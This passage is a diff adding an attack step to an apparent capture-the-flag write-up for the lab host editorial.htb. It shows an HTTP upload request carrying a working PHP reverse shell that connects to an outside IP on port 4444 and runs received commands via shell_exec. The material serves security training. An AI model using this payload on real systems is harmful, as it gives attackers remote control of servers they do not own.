@@ -162,3 +162,48 @@ OS and Service detection performed. Please report any incorrect results at https
   }
 }
 ```
+
+## Attack
+
+### burp reverse shell upload:
+```
+POST /upload-cover HTTP/1.1
+Host: editorial.htb
+Content-Length: 764
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykWD7CpV8HlDWAXhT
+Accept: */*
+Origin: http://editorial.htb
+Referer: http://editorial.htb/upload
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+------WebKitFormBoundarykWD7CpV8HlDWAXhT
+Content-Disposition: form-data; name="bookurl"
+
+
+------WebKitFormBoundarykWD7CpV8HlDWAXhT
+Content-Disposition: form-data; name="bookfile"; filename="reverse.shell.php"
+Content-Type: application/x-php
+
+<?php
+$ip = '10.10.14.252'; // change this to your IP address
+$port = 4444; // change this to your listening port
+$socket = fsockopen($ip, $port);
+if ($socket) {
+    $shell = 'uname -a; w; id; /bin/sh -i';
+    fwrite($socket, $shell);
+    while (!feof($socket)) {
+        $command = fgets($socket);
+        $output = '';
+        if ($command) {
+            $output = shell_exec($command);
+            fwrite($socket, $output);
+        }
+    }
+    fclose($socket);
+}
+?>
+------WebKitFormBoundarykWD7CpV8HlDWAXhT--
+```
